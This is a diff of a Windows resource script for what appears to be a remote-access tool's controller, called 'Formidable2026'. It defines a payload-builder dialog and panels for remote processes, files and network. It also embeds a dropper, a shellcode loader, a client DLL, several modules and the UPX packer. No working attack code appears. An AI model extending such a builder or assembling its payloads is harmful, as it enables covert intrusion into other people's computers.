@@ -19,6 +19,7 @@ IDI_SETTINGS    ICON    "res/Settings.ico"
 IDI_BUILDER     ICON    "res/Builder.ico"
 IDI_HELP        ICON    "res/Help.ico"
 IDI_HISTORY     ICON    "res/History.ico"
+IDI_NETWORK     ICON    "res/Network.ico"
 IDD_BUILDER DIALOGEX 0, 0, 420, 230
 STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
 CAPTION "生成服务端"
@@ -80,12 +81,23 @@ BEGIN
     PUSHBUTTON      "导出列表", IDC_BTN_EXPORT_HISTORY, 70, 280, 60, 14
     DEFPUSHBUTTON   "关闭", IDOK, 435, 280, 60, 14
 END
-IDD_PROCESS DIALOGEX 0, 0, 400, 250
-STYLE DS_SETFONT | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MAXIMIZEBOX
+IDD_PROCESS DIALOGEX 0, 0, 450, 250
+STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
 CAPTION "进程管理"
-FONT 9, "MS Shell Dlg", 400, 0, 0x1
+FONT 9, "Microsoft YaHei", 400, 0, 0x1
 BEGIN
-    CONTROL         "", IDC_LIST_PROCESS, "SysListView32", LVS_REPORT | LVS_SHOWSELALWAYS | WS_BORDER | WS_TABSTOP, 5, 5, 390, 240
+    CONTROL         "",IDC_LIST_PROCESS,"SysListView32",LVS_REPORT | LVS_SHOWSELALWAYS | LVS_ALIGNLEFT | WS_BORDER | WS_TABSTOP,7,7,436,216
+    PUSHBUTTON      "刷新(&R)",IDC_BTN_REFRESH,7,229,50,14
+    PUSHBUTTON      "结束进程(&K)",IDC_BTN_KILL,63,229,50,14
+END
+
+IDD_NETWORK DIALOGEX 0, 0, 450, 250
+STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
+CAPTION "网络管理"
+FONT 9, "Microsoft YaHei", 400, 0, 0x1
+BEGIN
+    CONTROL         "",IDC_LIST_NETWORK,"SysListView32",LVS_REPORT | LVS_SHOWSELALWAYS | LVS_ALIGNLEFT | WS_BORDER | WS_TABSTOP,7,7,436,216
+    PUSHBUTTON      "刷新(&R)",IDC_BTN_NET_REFRESH,7,229,50,14
 END
 
 IDD_MODULES DIALOGEX 0, 0, 400, 250
@@ -179,21 +191,26 @@ BEGIN
     CONTROL         "", IDC_STATIC_SCREEN, "Static", SS_BITMAP | SS_CENTERIMAGE | WS_BORDER, 0, 0, 640, 480
 END
 
-IDD_FILE DIALOGEX 0, 0, 500, 400
+IDD_FILE DIALOGEX 0, 0, 600, 470
 STYLE DS_SETFONT | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MAXIMIZEBOX
 CAPTION "文件管理"
 FONT 9, "MS Shell Dlg", 400, 0, 0x1
 BEGIN
-    LTEXT           "远程路径:", IDC_STATIC_FILE_PATH_REMOTE, 5, 7, 35, 12
-    EDITTEXT        IDC_EDIT_FILE_PATH_REMOTE, 45, 5, 400, 14, ES_AUTOHSCROLL
-    DEFPUSHBUTTON   "转到", IDC_BTN_FILE_GO_REMOTE, 450, 4, 45, 16
-    CONTROL         "", IDC_LIST_FILE_REMOTE, "SysListView32", LVS_REPORT | LVS_SHOWSELALWAYS | WS_BORDER | WS_TABSTOP, 0, 25, 500, 349
+    LTEXT           "远程路径:", IDC_STATIC_FILE_PATH_REMOTE, 6, 14, 50, 12
+    EDITTEXT        IDC_EDIT_FILE_PATH_REMOTE, 61, 10, 418, 20, ES_AUTOHSCROLL
+    DEFPUSHBUTTON   "转到", IDC_BTN_FILE_GO_REMOTE, 549, 8, 42, 24
+    LTEXT           "搜索:", 0, 491, 14, 28, 12
+    EDITTEXT        IDC_EDIT_FILE_SEARCH, 521, 10, 25, 20, ES_AUTOHSCROLL
+    CONTROL         "", IDC_LIST_FILE_REMOTE, "SysListView32", LVS_REPORT | LVS_SHOWSELALWAYS | WS_BORDER | WS_TABSTOP, 6, 72, 588, 350
 
-    PUSHBUTTON      "返回", IDC_BTN_FILE_REMOTE_BACK, 5, 376, 55, 18
-    PUSHBUTTON      "新建文件夹", IDC_BTN_FILE_REMOTE_MKDIR, 65, 376, 70, 18
-    PUSHBUTTON      "重命名", IDC_BTN_FILE_REMOTE_RENAME, 140, 376, 55, 18
-    PUSHBUTTON      "删除", IDC_BTN_FILE_REMOTE_DELETE, 200, 376, 55, 18
-    PUSHBUTTON      "刷新", IDC_BTN_FILE_REMOTE_REFRESH, 260, 376, 55, 18
+    PUSHBUTTON      "返回", IDC_BTN_FILE_REMOTE_BACK, 6, 42, 60, 26
+    PUSHBUTTON      "新建文件夹", IDC_BTN_FILE_REMOTE_MKDIR, 70, 42, 60, 26
+    PUSHBUTTON      "重命名", IDC_BTN_FILE_REMOTE_RENAME, 134, 42, 60, 26
+    PUSHBUTTON      "删除", IDC_BTN_FILE_REMOTE_DELETE, 198, 42, 60, 26
+    PUSHBUTTON      "刷新", IDC_BTN_FILE_REMOTE_REFRESH, 262, 42, 60, 26
+    PUSHBUTTON      "视图", IDC_BTN_FILE_VIEW, 326, 42, 60, 26
+
+    CONTROL         "", IDC_STATUS_FILE_BAR, "msctls_statusbar32", WS_CHILD | WS_VISIBLE | CCS_BOTTOM | SBARS_SIZEGRIP, 0, 425, 600, 20
 END
 IDD_VIDEO DIALOGEX 0, 0, 400, 300
 STYLE DS_SETFONT | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MAXIMIZEBOX
@@ -229,29 +246,41 @@ BEGIN
 END
 // 二进制资源 - x86
 #if defined(_DEBUG)
-IDR_CLIENT_EXE_X86      BIN     "Client.exe"
-IDR_MOD_PROCESS_X86     BIN     "ModuleProcessManager.dll"
-IDR_MOD_SYSTEM_X86      BIN     "ModuleSystemInfo.dll"
-IDR_MOD_TERMINAL_X86    BIN     "ModuleTerminal.dll"
-IDR_MOD_WINDOW_X86      BIN     "ModuleWindowManager.dll"
-IDR_MOD_FILE_X86        BIN     "ModuleFileManager.dll"
-IDR_MOD_SERVICE_X86     BIN     "ModuleServiceManager.dll"
-IDR_MOD_REGISTRY_X86    BIN     "ModuleRegistryManager.dll"
-IDR_MOD_MULTIMEDIA_X86  BIN     "ModuleMultimedia.dll"
+IDR_CLIENT_EXE          BIN     "Client.exe"
+IDR_CLIENT_DLL          BIN     "ClientDLL.dll"
+IDR_LOADER_EXE          BIN     "ShellCodeLoader.exe"
+IDR_DROPPER_EXE         BIN     "Dropper.exe"
+IDR_MOD_PROCESS         BIN     "ModuleProcessManager.dll"
+IDR_MOD_SYSTEM          BIN     "ModuleSystemInfo.dll"
+IDR_MOD_TERMINAL        BIN     "ModuleTerminal.dll"
+IDR_MOD_WINDOW          BIN     "ModuleWindowManager.dll"
+IDR_MOD_FILE            BIN     "ModuleFileManager.dll"
+IDR_MOD_SERVICE         BIN     "ModuleServiceManager.dll"
+IDR_MOD_REGISTRY        BIN     "ModuleRegistryManager.dll"
+IDR_MOD_MULTIMEDIA      BIN     "ModuleMultimedia.dll"
+IDR_MOD_NETWORK         BIN     "ModuleNetworkManager.dll"
 #else
-IDR_CLIENT_EXE_X86      BIN     "..\\Formidable2026\\x86\\Client.exe"
-IDR_MOD_PROCESS_X86     BIN     "..\\Formidable2026\\x86\\ProcessManager.dll"
-IDR_MOD_SYSTEM_X86      BIN     "..\\Formidable2026\\x86\\SystemInfo.dll"
-IDR_MOD_TERMINAL_X86    BIN     "..\\Formidable2026\\x86\\Terminal.dll"
-IDR_MOD_WINDOW_X86      BIN     "..\\Formidable2026\\x86\\WindowManager.dll"
-IDR_MOD_FILE_X86        BIN     "..\\Formidable2026\\x86\\FileManager.dll"
-IDR_MOD_SERVICE_X86     BIN     "..\\Formidable2026\\x86\\ServiceManager.dll"
-IDR_MOD_REGISTRY_X86    BIN     "..\\Formidable2026\\x86\\RegistryManager.dll"
-IDR_MOD_MULTIMEDIA_X86  BIN     "..\\Formidable2026\\x86\\Multimedia.dll"
+IDR_CLIENT_EXE          BIN     "..\\Formidable2026\\x86\\Client.exe"
+IDR_CLIENT_DLL          BIN     "..\\Formidable2026\\x86\\ClientDLL.dll"
+IDR_LOADER_EXE          BIN     "..\\Formidable2026\\x86\\ShellCodeLoader.exe"
+IDR_DROPPER_EXE         BIN     "..\\Formidable2026\\x86\\Dropper.exe"
+IDR_MOD_PROCESS         BIN     "..\\Formidable2026\\x86\\ProcessManager.dll"
+IDR_MOD_SYSTEM          BIN     "..\\Formidable2026\\x86\\SystemInfo.dll"
+IDR_MOD_TERMINAL        BIN     "..\\Formidable2026\\x86\\Terminal.dll"
+IDR_MOD_WINDOW          BIN     "..\\Formidable2026\\x86\\WindowManager.dll"
+IDR_MOD_FILE            BIN     "..\\Formidable2026\\x86\\FileManager.dll"
+IDR_MOD_SERVICE         BIN     "..\\Formidable2026\\x86\\ServiceManager.dll"
+IDR_MOD_REGISTRY        BIN     "..\\Formidable2026\\x86\\RegistryManager.dll"
+IDR_MOD_MULTIMEDIA      BIN     "..\\Formidable2026\\x86\\Multimedia.dll"
+IDR_MOD_NETWORK         BIN     "..\\Formidable2026\\x86\\ModuleNetworkManager.dll"
 #endif
+
 // 二进制资源 - x64
 #if defined(_DEBUG)
 IDR_CLIENT_EXE_X64      BIN     "Client.exe"
+IDR_CLIENT_DLL_X64      BIN     "ClientDLL.dll"
+IDR_LOADER_EXE_X64      BIN     "ShellCodeLoader.exe"
+IDR_DROPPER_EXE_X64     BIN     "Dropper.exe"
 IDR_MOD_PROCESS_X64     BIN     "ModuleProcessManager.dll"
 IDR_MOD_SYSTEM_X64      BIN     "ModuleSystemInfo.dll"
 IDR_MOD_TERMINAL_X64    BIN     "ModuleTerminal.dll"
@@ -260,8 +289,12 @@ IDR_MOD_FILE_X64        BIN     "ModuleFileManager.dll"
 IDR_MOD_SERVICE_X64     BIN     "ModuleServiceManager.dll"
 IDR_MOD_REGISTRY_X64    BIN     "ModuleRegistryManager.dll"
 IDR_MOD_MULTIMEDIA_X64  BIN     "ModuleMultimedia.dll"
+IDR_MOD_NETWORK_X64     BIN     "ModuleNetworkManager.dll"
 #else
 IDR_CLIENT_EXE_X64      BIN     "..\\Formidable2026\\x64\\Client.exe"
+IDR_CLIENT_DLL_X64      BIN     "..\\Formidable2026\\x64\\ClientDLL.dll"
+IDR_LOADER_EXE_X64      BIN     "..\\Formidable2026\\x64\\ShellCodeLoader.exe"
+IDR_DROPPER_EXE_X64     BIN     "..\\Formidable2026\\x64\\Dropper.exe"
 IDR_MOD_PROCESS_X64     BIN     "..\\Formidable2026\\x64\\ProcessManager.dll"
 IDR_MOD_SYSTEM_X64      BIN     "..\\Formidable2026\\x64\\SystemInfo.dll"
 IDR_MOD_TERMINAL_X64    BIN     "..\\Formidable2026\\x64\\Terminal.dll"
@@ -270,4 +303,12 @@ IDR_MOD_FILE_X64        BIN     "..\\Formidable2026\\x64\\FileManager.dll"
 IDR_MOD_SERVICE_X64     BIN     "..\\Formidable2026\\x64\\ServiceManager.dll"
 IDR_MOD_REGISTRY_X64    BIN     "..\\Formidable2026\\x64\\RegistryManager.dll"
 IDR_MOD_MULTIMEDIA_X64  BIN     "..\\Formidable2026\\x64\\Multimedia.dll"
+IDR_MOD_NETWORK_X64     BIN     "..\\Formidable2026\\x64\\ModuleNetworkManager.dll"
+#endif
+
+// UPX
+#if defined(_DEBUG)
+IDR_UPX_EXE             BIN     "upx.exe"
+#else
+IDR_UPX_EXE             BIN     "..\\thirdparty\\Bin\\upx.exe"
 #endif
